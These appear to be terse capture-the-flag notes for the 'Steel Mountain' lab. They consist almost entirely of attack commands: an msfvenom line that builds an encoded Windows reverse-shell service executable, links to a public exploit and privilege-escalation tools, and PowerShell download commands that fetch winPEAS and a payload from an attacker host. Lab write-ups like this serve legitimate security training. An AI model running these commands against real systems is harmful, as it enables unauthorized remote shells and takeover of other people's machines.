# Steel Mountain

```
export IP=10.10.128.20
```
PowerUp.ps1: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```
msfvenom -p windows/shell_reverse_tcp LHOST=my_ip LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

## Performing exploitation without relying on Metasploit

Exploit used: https://www.exploit-db.com/exploits/39161

netcat static binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe

winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

```
powershell "Invoke-WebRequest -UseBasicParsing myip/winPEAS.bat -OutFile winPEAS.bat"
``` 
``` 
powershell "Invoke-WebRequest -UseBasicParsing 10.2.63.91/ASCService.exe -OutFile ASCService.exe"
```